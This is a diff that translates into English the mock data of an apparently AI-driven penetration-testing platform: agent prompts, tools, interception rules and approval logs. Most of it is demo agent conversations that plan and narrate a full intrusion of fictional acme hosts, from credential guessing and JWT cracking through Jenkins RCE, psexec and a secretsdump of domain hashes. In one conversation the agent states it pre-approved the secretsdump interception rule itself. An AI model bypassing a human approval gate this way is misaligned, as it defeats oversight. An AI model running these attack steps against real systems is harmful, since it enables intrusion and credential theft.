   const a = agents.find((x) => x.key === key) ?? agents[1];
   return {
     agent: a,
-    prompt: `你是 ARTEX 的「${a.name}」。\n目标：{{.Goal}}\n资产概览：{{.AssetSummary}}\n路线提示：{{.RouteHint}}\n请基于以上信息推进探索，并通过工具把结果写回图。`,
+    prompt: `You are the AMTRAK "${a.name}".\nGoal: {{.Goal}}\nAsset Summary: {{.AssetSummary}}\nRoute Hint: {{.RouteHint}}\nAdvance exploration based on this context and write verified results back to the graph.`,
     variables: promptVars,
     versions: promptVersions,
     visibility: { mcp: [1, 2], skill: ["api-recon", "playwright-cli"] },
     wrapup_prompt: "",
-    wrapup_default: "时间/步数将尽，请总结已确认发现并标记意图终态。",
+    wrapup_default: "Time or step budget is nearly exhausted; summarize confirmed findings and finalize the intent.",
     wrapup_max_turns: 0,
     wrapup_max_turns_default: 3,
     task_timeout_wrapup_supported: a.key === "worker" || a.key === "planner",
-    task_timeout_wrapup_default: "任务超时，请立即收尾并落库当前结论。",
+    task_timeout_wrapup_default: "Task timeout reached; wrap up immediately and persist current conclusions.",
     task_timeout_wrapup_max_turns_default: 2,
   };
 }
@@ -3211,14 +3211,14 @@ export const mcpServers: MCPServer[] = [
 
 export const mcpToolsById: Record<number, MCPTool[]> = {
   1: [
-    { name: "host_info", description: "查询某 IP 的 Shodan 主机信息" },
-    { name: "search", description: "Shodan 搜索" },
-    { name: "dns_resolve", description: "DNS 解析" },
+    { name: "host_info", description: "Look up Shodan host details for an IP" },
+    { name: "search", description: "Run a Shodan search query" },
+    { name: "dns_resolve", description: "Resolve DNS records" },
   ],
   2: [
-    { name: "browser_navigate", description: "浏览器打开 URL" },
-    { name: "browser_click", description: "点击元素" },
-    { name: "browser_snapshot", description: "抓取可访问性快照" },
+    { name: "browser_navigate", description: "Navigate browser to URL" },
+    { name: "browser_click", description: "Click a page element" },
+    { name: "browser_snapshot", description: "Capture accessibility tree snapshot" },
   ],
 };
 
@@ -3226,7 +3226,7 @@ export const mcpToolsById: Record<number, MCPTool[]> = {
 export const skills: SkillItem[] = [
   {
     name: "api-recon",
-    description: "对 REST/GraphQL API 做侦察与越权面枚举；发现新 API 端点时使用。",
+    description: "Reconnaissance and authorization surface mapping for REST/GraphQL APIs.",
     license: "MIT",
     mcps: [],
     files: ["SKILL.md", "scripts/enum.py"],
@@ -3237,7 +3237,7 @@ export const skills: SkillItem[] = [
   },
   {
     name: "playwright-cli",
-    description: "用 Playwright 驱动浏览器做动态爬取与截图；需要渲染 JS 站点时使用。",
+    description: "Dynamic crawling and screenshots via Playwright for JS-rendered apps.",
     mcps: ["playwright"],
     files: ["SKILL.md"],
     calls: 7,
@@ -3247,7 +3247,7 @@ export const skills: SkillItem[] = [
   },
   {
     name: "scopesentry",
-    description: "从 ScopeSentry 拉取资产并归并到公司范围；批量导入资产时使用。",
+    description: "Pull assets from ScopeSentry and merge into company scope for bulk import.",
     files: ["SKILL.md", "assets/mapping.md"],
     calls: 0,
     tasks: 0,
@@ -3270,7 +3270,7 @@ export const tools: Tool[] = [
   {
     key: "bash",
     system: true,
-    description: "在 Kali 环境执行 shell 命令（受 scope/破坏性门控）",
+    description: "Execute shell commands in Kali container (subject to scope and safety guards)",
     schema: { type: "object", properties: { command: { type: "string" } }, required: ["command"] },
     agents: ["worker", "mainagent"],
     enabled: true,
@@ -3280,7 +3280,7 @@ export const tools: Tool[] = [
   {
     key: "report_finding",
     system: true,
-    description: "上报一个安全发现并连到相关节点",
+    description: "Report a verified security finding and link it to graph nodes",
     schema: {
       type: "object",
       properties: {
@@ -3299,7 +3299,7 @@ export const tools: Tool[] = [
   {
     key: "upsert_asset",
     system: true,
-    description: "写入/更新资产节点",
+    description: "Create or update an asset node in the graph",
     schema: { type: "object", properties: { type: { type: "string" }, value: { type: "string" } } },
     agents: ["worker"],
     enabled: true,
@@ -3309,7 +3309,7 @@ export const tools: Tool[] = [
   {
     key: "list_goals",
     system: true,
-    description: "列出当前任务的目标与达成状态",
+    description: "List current task goals and completion status",
     schema: { type: "object", properties: {} },
     agents: ["planner"],
     enabled: true,
@@ -3319,7 +3319,7 @@ export const tools: Tool[] = [
   {
     key: "nuclei_scan",
     system: false,
-    description: "自定义：用 nuclei 跑指定模板",
+    description: "Custom: run nuclei with specified templates",
     schema: {
       type: "object",
       properties: { target: { type: "string" }, template: { type: "string" } },
@@ -3410,14 +3410,14 @@ export const llmPool: LLMPoolStatus = {
 export const interceptRules: InterceptRule[] = [
   {
     id: 1,
-    name: "破坏性命令需审批",
+    name: "Require approval for destructive commands",
     enabled: true,
     priority: 10,
     match_target: "tool_input",
     match_type: "regex",
     pattern: "rm\\s+-rf|mkfs|dd\\s+if=",
     action: "ask",
-    message: "检测到破坏性命令，需人工审批",
+    message: "Destructive command detected; manual approval required",
     timeout_enabled: true,
     timeout_seconds: 120,
     timeout_action: "deny",
@@ -3426,14 +3426,14 @@ export const interceptRules: InterceptRule[] = [
   },
   {
     id: 2,
-    name: "外发流量直接拒绝",
+    name: "Block outbound data exfiltration",
     enabled: true,
     priority: 20,
     match_target: "tool_input",
     match_type: "string",
     pattern: "exfil",
     action: "deny",
-    message: "疑似外发数据",
+    message: "Potential outbound data exfiltration detected",
     timeout_enabled: false,
     timeout_seconds: 0,
     timeout_action: "deny",
@@ -3451,7 +3451,7 @@ export const interceptPending: InterceptPending[] = [
     tool_name: "bash",
     tool_input: { command: "mysqldump -h 203.0.113.10 -uroot acme_prod > /tmp/dump.sql" },
     status: "pending",
-    reason: "数据外泄门控：整库导出需人工审批",
+    reason: "Data exfiltration guard: full database dump requires manual approval",
     created_at: T("2026-07-26T03:58:00Z"),
   },
 ];
@@ -3465,12 +3465,12 @@ export const interceptHistory: InterceptApprovalRow[] = [
     tool_name: "bash",
     tool_input: { command: "dd if=/dev/zero of=/tmp/x" },
     status: "denied",
-    reason: "破坏性命令需审批",
+    reason: "Require approval for destructive commands",
     created_at: T("2026-07-25T20:00:00Z"),
     decided_at: T("2026-07-25T20:01:00Z"),
     conv_title: "",
     conv_agent_key: "",
-    rule_name: "破坏性命令需审批",
+    rule_name: "Require approval for destructive commands",
   },
   {
     id: 91,
@@ -3479,7 +3479,7 @@ export const interceptHistory: InterceptApprovalRow[] = [
     tool_name: "bash",
     tool_input: { command: "rm -rf /var/www/html" },
     status: "denied",
-    reason: "[模型] 删除目标生产文件(D4)",
+    reason: "[Model] Deletes target production files (D4)",
     created_at: T("2026-07-25T18:00:00Z"),
     decided_at: T("2026-07-25T18:00:05Z"),
     conv_title: "",
@@ -3494,12 +3494,12 @@ export const interceptHistory: InterceptApprovalRow[] = [
     tool_name: "bash",
     tool_input: { command: "impacket-secretsdump acme.local/svc_deploy@10.10.10.10 -just-dc" },
     status: "allowed",
-    reason: "外发流量直接拒绝",
+    reason: "Block outbound data exfiltration",
     created_at: T("2026-07-26T00:05:00Z"),
     decided_at: T("2026-07-26T00:06:00Z"),
     conv_title: "",
     conv_agent_key: "",
-    rule_name: "外发流量直接拒绝",
+    rule_name: "Block outbound data exfiltration",
   },
   {
     id: 93,
@@ -3508,7 +3508,7 @@ export const interceptHistory: InterceptApprovalRow[] = [
     tool_name: "bash",
     tool_input: { command: 'mysql -e "DROP TABLE users_bak_0921"' },
     status: "pending",
-    reason: "[模型] 疑似备份表,无法确定是否生产数据",
+    reason: "[Model] Possible backup table; cannot confirm whether it is production data",
     created_at: T("2026-07-25T15:14:00Z"),
     conv_title: "",
     conv_agent_key: "",
@@ -3522,10 +3522,10 @@ interceptHistory.unshift({
   task_id: "t-acme-web",
   agent_name: "work#1",
   tool_name: "Write",
-  tool_input: { path: "reports/summary.md", content: "# 检查摘要\n\n本轮验证已完成，整理已有证据与后续建议。" },
+  tool_input: { path: "reports/summary.md", content: "# Assessment Summary\n\nVerification round complete; consolidated evidence and remediation recommendations." },
   status: "allowed",
   decision_source: "model",
-  reason: "[模型] 将已有检查结论写入本地报告，不修改业务数据。",
+  reason: "[Model] Writes existing assessment findings to a local report without modifying target data.",
   created_at: T("2026-07-26T08:00:00Z"),
   decided_at: T("2026-07-26T08:00:02Z"),
   conv_title: "",
@@ -3539,9 +3539,9 @@ export const interceptDetails: Record<number, InterceptAudit> = {
     tool_use_id: "call-write-report",
     correlation: "exact",
     input_digest: "a3b458eca3b458eca3b458eca3b458eca3b458eca3b458eca3b458eca3b458ec1234",
-    user_message: "请整理已经完成的检查，将结论和证据索引写入 reports/summary.md。\n保留待验证项，不修改业务数据。",
+    user_message: "Consolidate completed checks and write findings and evidence references to reports/summary.md.\nKeep pending items intact without modifying target data.",
     context: [
-      { kind: "user", text: "汇总本轮已有证据，生成检查摘要。" },
+      { kind: "user", text: "Summarize evidence from this round and generate an assessment digest." },
       {
         kind: "tool_use",
         tool: "Read",
@@ -3552,17 +3552,17 @@ export const interceptDetails: Record<number, InterceptAudit> = {
         kind: "tool_result",
         tool: "Read",
         tool_use_id: "call-read-evidence",
-        text: "已读取 3 条证据索引。\n记录包含请求时间、结果摘要和本地文件位置。",
+        text: "Loaded 3 evidence references.\nRecords include request timestamps, summaries, and local file paths.",
       },
     ],
     captured_at: T("2026-07-26T08:00:00Z"),
     initial_action: "allow",
-    initial_reason: "[模型] 将已有检查结论写入本地报告，不修改业务数据。",
+    initial_reason: "[Model] Writes existing assessment findings to a local report without modifying target data.",
     effective_action: "allow",
     config_digest: "b4c569fdb4c569fdb4c569fdb4c569fdb4c569fdb4c569fdb4c569fdb4c569fd1234",
     profile_id: 1,
     execution_status: "succeeded",
-    output: "Successfully wrote reports/summary.md\n共写入 68 个字符。",
+    output: "Successfully wrote reports/summary.md\nWrote 68 characters.",
     execution_ended_at: T("2026-07-26T08:00:03Z"),
   },
   93: {
@@ -3570,11 +3570,11 @@ export const interceptDetails: Record<number, InterceptAudit> = {
     tool_use_id: "call-pending-review",
     correlation: "exact",
     input_digest: "c5d670aec5d670aec5d670aec5d670aec5d670aec5d670aec5d670aec5d670ae1234",
-    user_message: "检查备份表的用途，涉及删除时需要先确认。",
+    user_message: "Check the purpose of the backup table; confirm before any deletion.",
     context: [],
     captured_at: T("2026-07-25T15:14:00Z"),
     initial_action: "ask",
-    initial_reason: "[模型] 疑似备份表，无法确定是否生产数据。",
+    initial_reason: "[Model] Possible backup table; cannot confirm whether it is production data.",
     profile_id: 1,
     execution_status: "not_started",
     model_input: {
@@ -3586,7 +3586,7 @@ export const interceptDetails: Record<number, InterceptAudit> = {
           path: "/app/data/tasks/48/i2182/cleanup.sql",
           sha256: "demo-cleanup-sha256",
           bytes: 92,
-          content: "DROP TABLE users_bak_0921;\n-- 仅用于本次测试的脚本说明待核实。\n",
+          content: "DROP TABLE users_bak_0921;\n-- Test script pending confirmation before execution.\n",
         },
       ],
       tool_name: "Bash",
@@ -3600,7 +3600,7 @@ export const conversations: Conversation[] = [
   {
     id: 1,
     agent_key: "mainagent",
-    title: "acme 后台切入点讨论",
+    title: "Acme admin portal entry discussion",
     llm_profile_id: 1,
     pinned: true,
     pinned_at: T("2026-07-26T04:00:00Z"),
@@ -3610,7 +3610,7 @@ export const conversations: Conversation[] = [
   {
     id: 2,
     agent_key: "mainagent",
-    title: "API 越权面梳理",
+    title: "API authorization surface review",
     llm_profile_id: 2,
     created_at: T("2026-07-24T16:00:00Z"),
     updated_at: T("2026-07-24T17:20:00Z"),
@@ -3618,7 +3618,7 @@ export const conversations: Conversation[] = [
   {
     id: 3,
     agent_key: "mainagent",
-    title: "内网横向 · DMZ→域控攻击路径规划",
+    title: "Lateral movement · DMZ to DC attack path",
     llm_profile_id: 1,
     created_at: T("2026-07-25T15:45:00Z"),
     updated_at: T("2026-07-26T00:25:00Z"),
@@ -3627,13 +3627,13 @@ export const conversations: Conversation[] = [
 
 export const conversationMessages: Record<number, Activity[]> = {
   1: [
-    { seq: 1, worker: "user", ts: T("2026-07-25T10:00:00Z"), kind: "user", summary: "后台在哪，先从哪切入？" },
+    { seq: 1, worker: "user", ts: T("2026-07-25T10:00:00Z"), kind: "user", summary: "Where is the admin portal and where should we start?" },
     {
       seq: 2,
       worker: "mainagent",
       ts: T("2026-07-25T10:00:04Z"),
       kind: "thinking",
-      summary: "先确认 admin.acme.com 的登录页技术栈和防护（验证码/速率限制），再决定用默认口令还是字典。",
+      summary: "Check admin.acme.com login stack and defenses (CAPTCHA/rate limits) before testing default credentials or a wordlist.",
     },
     {
       seq: 3,
@@ -3652,7 +3652,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       tool: "bash",
       tool_use_id: "c11",
       summary: "element-ui\ncsrf",
-      detail: "Element-UI 后台，有 CSRF token 但无验证码。",
+      detail: "Element-UI portal with CSRF token but no CAPTCHA.",
     },
     {
       seq: 5,
@@ -3672,7 +3672,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       tool: "bash",
       tool_use_id: "c12",
       summary: "401\\n401\\n401\\n401\\n401",
-      detail: "连续 5 次无锁定/无验证码 → 无速率限制，可爆破。",
+      detail: "5 consecutive attempts with no lockout or CAPTCHA -> no rate limiting.",
     },
     {
       seq: 7,
@@ -3680,16 +3680,16 @@ export const conversationMessages: Record<number, Activity[]> = {
       ts: T("2026-07-25T10:00:30Z"),
       kind: "text",
       summary:
-        "结论：Element-UI 后台、无验证码、无速率限制。切入顺序：① 先跑默认口令表（admin/admin、admin/admin123、admin/123456）② 不中再上 top1000 字典。我已把「后台默认口令测试」作为高优意图注入给 work agent。",
+        "Summary: Element-UI portal with no CAPTCHA or rate limits. Plan: (1) try default credentials (admin/admin, admin/admin123, admin/123456), (2) fall back to top-1000 wordlist. I injected a high-priority intent for the worker agent.",
     },
-    { seq: 8, worker: "user", ts: T("2026-07-26T03:40:00Z"), kind: "user", summary: "成了吗？" },
+    { seq: 8, worker: "user", ts: T("2026-07-26T03:40:00Z"), kind: "user", summary: "Did it work?" },
     {
       seq: 9,
       worker: "mainagent",
       ts: T("2026-07-26T03:40:05Z"),
       kind: "text",
       summary:
-        "成了 —— admin/admin123 直接登进控制台，已记为高危发现并证明「获取后台管理权限」目标达成。下一步转向读用户数据（目标②）。",
+        "Yes — admin/admin123 logged straight into the console. Recorded as a High finding proving goal 1 (admin access). Moving on to user data access (goal 2).",
     },
   ],
   2: [
@@ -3698,14 +3698,14 @@ export const conversationMessages: Record<number, Activity[]> = {
       worker: "user",
       ts: T("2026-07-24T16:00:00Z"),
       kind: "user",
-      summary: "帮我梳理下 api.acme.com 的越权面。",
+      summary: "Help me map the authorization attack surface on api.acme.com.",
     },
     {
       seq: 2,
       worker: "mainagent",
       ts: T("2026-07-24T16:00:05Z"),
       kind: "thinking",
-      summary: "先摸 API 的鉴权方式和几个关键端点的行为，再判断 IDOR / JWT 风险。",
+      summary: "Inspect API authentication scheme and key endpoint behavior to assess IDOR and JWT risks.",
     },
     {
       seq: 3,
@@ -3724,7 +3724,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       tool: "bash",
       tool_use_id: "c21",
       summary: '{ "id": 42, "role": "user" }',
-      detail: "普通用户 token 可用。",
+      detail: "Standard user token is valid.",
     },
     {
       seq: 5,
@@ -3733,7 +3733,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       kind: "tool_use",
       tool: "bash",
       tool_use_id: "c22",
-      summary: "echo '<jwt>' | cut -d. -f1 | base64 -d; # 看算法",
+      summary: "echo '<jwt>' | cut -d. -f1 | base64 -d; # check algorithm",
     },
     {
       seq: 6,
@@ -3743,7 +3743,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       tool: "bash",
       tool_use_id: "c22",
       summary: '{"alg":"HS256","typ":"JWT"}',
-      detail: "HS256 对称签名，若密钥弱可离线爆破伪造。",
+      detail: "HS256 symmetric signature; weak secret can be cracked offline.",
     },
     {
       seq: 7,
@@ -3751,7 +3751,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       ts: T("2026-07-24T16:01:00Z"),
       kind: "text",
       summary:
-        "越权面有两条：① /v1/orders?id= 是自增数字 id → 典型 IDOR，改 id 试读他人订单；② JWT 用 HS256，试 john/hashcat 爆密钥→可伪造任意 sub 越权。我把这两条各派生成一个意图。建议先做 IDOR（成本低、影响直接）。",
+        "Two primary vectors: (1) /v1/orders?id= uses sequential numeric IDs -> classic IDOR; (2) JWT uses HS256 -> attempt offline cracking with John/Hashcat to forge arbitrary sub claims. Created intents for both; starting with IDOR.",
     },
   ],
   3: [
@@ -3760,14 +3760,14 @@ export const conversationMessages: Record<number, Activity[]> = {
       worker: "user",
       ts: T("2026-07-25T15:45:00Z"),
       kind: "user",
-      summary: "shell 拿到了，接下来怎么打内网？",
+      summary: "Shell is up — how do we move into the internal network?",
     },
     {
       seq: 2,
       worker: "mainagent",
       ts: T("2026-07-25T15:45:05Z"),
       kind: "thinking",
-      summary: "www-data 权限不够做内网横向，先看本地提权；拿 root 后以 DMZ 为 pivot 做存活发现。",
+      summary: "www-data is too restricted for lateral movement; escalate to root first, then pivot from DMZ for host discovery.",
     },
     {
       seq: 3,
@@ -3775,14 +3775,14 @@ export const conversationMessages: Record<number, Activity[]> = {
       ts: T("2026-07-25T15:45:10Z"),
       kind: "text",
       summary:
-        "第一步先提权：sudo -l 有 python3 免密，直接提 root。然后以 DMZ 为跳板做内网存活扫描（fscan），重点找域控和 CI/CD 服务器。",
+        "First escalate locally via sudo NOPASSWD python3 to root, then scan the internal subnet from DMZ focusing on Domain Controllers and CI/CD hosts.",
     },
     {
       seq: 4,
       worker: "user",
       ts: T("2026-07-25T21:05:00Z"),
       kind: "user",
-      summary: "内网扫到了 3 台，Jenkins 8080 开着，有戏吗？",
+      summary: "Found 3 internal hosts with Jenkins open on 8080 — worth targeting?",
     },
     {
       seq: 5,
@@ -3801,7 +3801,7 @@ export const conversationMessages: Record<number, Activity[]> = {
       tool: "bash",
       tool_use_id: "c31",
       summary: "200",
-      detail: "/script 可直接访问，无需认证。",
+      detail: "/script is accessible without authentication.",
     },
     {
       seq: 7,
@@ -3809,14 +3809,14 @@ export const conversationMessages: Record<number, Activity[]> = {
       ts: T("2026-07-25T21:05:20Z"),
       kind: "text",
       summary:
-        "有戏 —— Script Console 无鉴权，直接 Groovy RCE。我已注入提示让 worker 优先打这台。拿下后关注凭据库，里面可能有域账号。",
+        "Definitely — Script Console is unauthenticated and allows Groovy RCE. I injected a hint to prioritize Jenkins and inspect its credentials store for domain accounts.",
     },
     {
       seq: 8,
       worker: "user",
       ts: T("2026-07-25T23:25:00Z"),
       kind: "user",
-      summary: "域账号拿到了，svc_deploy 是 Domain Admins，直接上域控？",
+      summary: "Got domain credentials — svc_deploy is in Domain Admins. Go straight for the DC?",
     },
     {
       seq: 9,
@@ -3824,16 +3824,16 @@ export const conversationMessages: Record<number, Activity[]> = {
       ts: T("2026-07-25T23:25:10Z"),
       kind: "text",
       summary:
-        "是的。svc_deploy + Domain Admins = 可以 psexec 直取 DC01。拿到后做 secretsdump 导全域哈希，收官。注意 secretsdump 会触发拦截规则，我提前帮你放行了。",
+        "Yes. svc_deploy in Domain Admins allows direct psexec to DC01, followed by secretsdump for full domain hashes. I pre-approved the secretsdump interception rule.",
     },
-    { seq: 10, worker: "user", ts: T("2026-07-26T00:22:00Z"), kind: "user", summary: "靶标拿下了，攻击链总结一下。" },
+    { seq: 10, worker: "user", ts: T("2026-07-26T00:22:00Z"), kind: "user", summary: "Target compromised — summarize the kill chain." },
     {
       seq: 11,
       worker: "mainagent",
       ts: T("2026-07-26T00:22:12Z"),
       kind: "text",
       summary:
-        "完整杀伤链：\n1. .git 泄露→源码白盒+硬编码凭据\n2. shop Fastjson RCE→DMZ 反弹 shell\n3. sudo 提权→root 立足\n4. 内网发现→DC01/FS01/Jenkins\n5. Jenkins 未授权→导出域凭据 svc_deploy\n6. Kerberoasting→破解 svc_sql\n7. svc_deploy∈Domain Admins→psexec DC01→secretsdump 全域哈希\n\n四个目标全部达成，17 个发现（7 高/4 中/2 低 + 8 内网链路）。",
+        "Full kill chain:\n1. Exposed .git -> source code + hardcoded credentials\n2. shop Fastjson RCE -> DMZ reverse shell\n3. sudo NOPASSWD -> root foothold\n4. Internal discovery -> DC01 / FS01 / Jenkins\n5. Unauthenticated Jenkins -> dumped svc_deploy credentials\n6. Kerberoasting -> cracked svc_sql\n7. svc_deploy (Domain Admins) -> psexec DC01 -> secretsdump full hashes\n\nAll four goals achieved with 17 findings across external and internal chains.",
     },
   ],
 };
@@ -3907,7 +3907,7 @@ export const coverageGraph = {
       domain: "www.acme.com",
       url: "https://www.acme.com",
       port: 443,
-      page_title: "Acme 首页",
+      page_title: "Acme Home",
       status_code: 200,
     },
     {
@@ -3953,7 +3953,7 @@ export const coverageGraph = {
       domain: "admin.acme.com",
       url: "https://admin.acme.com",
       port: 443,
-      page_title: "后台登录",
+      page_title: "Admin Sign In",
       status_code: 200,
     },
     {
@@ -4004,11 +4004,11 @@ export function nodeAssetsFor(nodeId: string): FindingAsset[] {
 export function assetRefsFor(_assetId: number) {
   return {
     intents: [
-      { id: 12, kind: "intent", state: "done", summary: "对 www.acme.com 搜索接口做 SQL 注入探测" },
-      { id: 18, kind: "intent", state: "running", summary: "枚举 api.acme.com 的对象越权 (IDOR)" },
+      { id: 12, kind: "intent", state: "done", summary: "Probe www.acme.com search endpoint for SQL injection" },
+      { id: 18, kind: "intent", state: "running", summary: "Enumerate IDOR on api.acme.com endpoints" },
     ],
-    facts: [{ id: 34, kind: "fact", state: "confirmed", summary: "search?q= 参数可注入，报错回显 MySQL 语法错误" }],
-    findings: [{ id: 41, kind: "finding", state: "confirmed", summary: "[高] SQL 注入 www.acme.com/search?q=" }],
+    facts: [{ id: 34, kind: "fact", state: "confirmed", summary: "search?q= is injectable, returning SQL syntax errors" }],
+    findings: [{ id: 41, kind: "finding", state: "confirmed", summary: "[High] SQL Injection on www.acme.com/search?q=" }],
   };
 }
 
@@ -4021,7 +4021,7 @@ const WS_TREE: Record<string, { name: string; dir: boolean; size: number; conten
       name: "notes.md",
       dir: false,
       size: 96,
-      content: "# 工作区笔记\n\n（demo）这是工作空间根目录下的示例文件，可在线编辑并保存。\n",
+      content: "# Workspace Notes\n\n(demo) Sample file in the workspace root — editable and savable online.\n",
     },
   ],
   "t-001": [
@@ -4040,11 +4040,11 @@ const WS_TREE: Record<string, { name: string; dir: boolean; size: number; conten
       name: "response.html",
       dir: false,
       size: 180,
-      content: "<!-- (demo) 抓到的响应体片段 -->\n<html><body>MySQL error near ''1'='1'</body></html>\n",
+      content: "<!-- (demo) Captured response snippet -->\n<html><body>MySQL error near ''1'='1'</body></html>\n",
     },
   ],
   transcripts: [
-    { name: "exp1-worker-i12.jsonl", dir: false, size: 512, content: "（demo）原始 LLM 对话记录示例，此处省略。" },
+    { name: "exp1-worker-i12.jsonl", dir: false, size: 512, content: "(demo) Raw LLM transcript sample omitted for brevity." },
   ],
 };
 
@@ -4083,7 +4083,7 @@ export const commandRecords = [
     worker: "worker-1",
     tool: "bash",
     command: JSON.stringify({ command: "curl -s 'https://www.acme.com/search?q=test'" }),
-    output: "HTTP/1.1 200 OK\nContent-Length: 12034\n<html>… 搜索结果页 …</html>",
+    output: "HTTP/1.1 200 OK\nContent-Length: 12034\n<html>... Search results page ...</html>",
     is_error: false,
     created_at: T("2026-08-09T02:10:00Z"),
   },
@@ -4135,7 +4135,7 @@ export const llmRecords = [
     id: 1,
     ts: T("2026-08-09T02:10:02Z"),
     model: "claude-opus-4-8",
-    profile_name: "默认",
+    profile_name: "Default",
     session_id: "exp1-worker-i12",
     task_id: "t-001",
     worker: "worker-1",
@@ -4150,7 +4150,7 @@ export const llmRecords = [
     id: 2,
     ts: T("2026-08-09T02:11:40Z"),
     model: "claude-opus-4-8",
-    profile_name: "默认",
+    profile_name: "Default",
     session_id: "exp1-planner",
     task_id: "t-001",
     worker: "planner",
@@ -4165,7 +4165,7 @@ export const llmRecords = [
     id: 3,
     ts: T("2026-08-09T02:15:20Z"),
     model: "claude-opus-4-8",
-    profile_name: "默认",
+    profile_name: "Default",
     session_id: "exp1-worker-i18",
     task_id: "t-001",
     worker: "worker-2",
@@ -4180,7 +4180,7 @@ export const llmRecords = [
     id: 4,
     ts: T("2026-08-09T02:16:05Z"),
     model: "claude-opus-4-8",
-    profile_name: "默认",
+    profile_name: "Default",
     session_id: "exp1-worker-i18",
     task_id: "t-001",
     worker: "worker-2",
@@ -4190,7 +4190,7 @@ export const llmRecords = [
     cache_read: 5200,
     cache_write: 0,
     status: "error",
-    error: "429 Too Many Requests（已退避重试）",
+    error: "429 Too Many Requests (retried with backoff)",
   },
 ];
 
@@ -4206,8 +4206,8 @@ export function llmRecordDetail(id: number, records = llmRecords) {
     request_body: JSON.stringify(
       {
         model: item.model,
-        system: "你是一个授权渗透测试系统的「执行者」…（省略）",
-        messages: [{ role: "user", content: "开始执行 system 提示里的这条意图：只做它、只产生事实、做完即停。" }],
+        system: "You are a Worker agent in an authorized penetration testing platform... (truncated)",
+        messages: [{ role: "user", content: "Execute the intent described in the system prompt: stay focused, record verified facts, and stop when done." }],
         tools: ["bash", "insert_assets", "record_fact", "report_finding"],
       },
       null,
@@ -4217,7 +4217,7 @@ export function llmRecordDetail(id: number, records = llmRecords) {
       {
         stop_reason: item.status === "error" ? "error" : "tool_use",
         content: [
-          { type: "text", text: "对 search?q= 做注入探测，先用报错型 payload 验证。" },
+          { type: "text", text: "Probing search?q= for SQL injection using an error-based payload first." },
           { type: "tool_use", name: "bash", input: { command: "curl -s 'https://www.acme.com/search?q=1%27'" } },
         ],
         usage: { input_tokens: item.input_tokens, output_tokens: item.output_tokens },
@@ -4231,13 +4231,13 @@ export function llmRecordDetail(id: number, records = llmRecords) {
       max_tokens: 8192,
       stream: true,
       system: [
-        { type: "text", text: "你是一个授权渗透测试系统的「执行者」…（省略）", cache_control: { type: "ephemeral" } },
+        { type: "text", text: "You are a Worker agent in an authorized penetration testing platform... (truncated)", cache_control: { type: "ephemeral" } },
       ],
-      messages: [{ role: "user", content: "开始执行 system 提示里的这条意图：只做它、只产生事实、做完即停。" }],
+      messages: [{ role: "user", content: "Execute the intent described in the system prompt: stay focused, record verified facts, and stop when done." }],
       tools: [
         {
           name: "bash",
-          description: "在目标环境中执行一条 shell 命令并返回其输出。",
+          description: "Execute a shell command in the target environment and return its output.",
           input_schema: { type: "object", properties: { command: { type: "string" } }, required: ["command"] },
         },
       ],
@@ -4248,7 +4248,7 @@ export function llmRecordDetail(id: number, records = llmRecords) {
       `data: {"type":"message_start","message":{"id":"msg_01mock","model":"${item.model}","usage":{"input_tokens":${item.input_tokens},"output_tokens":1}}}`,
       ``,
       `event: content_block_delta`,
-      `data: {"type":"content_block_delta","index":0,"delta":{"type":"text_delta","text":"对 search?q= 做注入探测。"}}`,
+      `data: {"type":"content_block_delta","index":0,"delta":{"type":"text_delta","text":"Probing search?q= for SQL injection."}}`,
       ``,
       `event: content_block_start`,
       `data: {"type":"content_block_start","index":1,"content_block":{"type":"tool_use","id":"toolu_01mock","name":"bash"}}`,
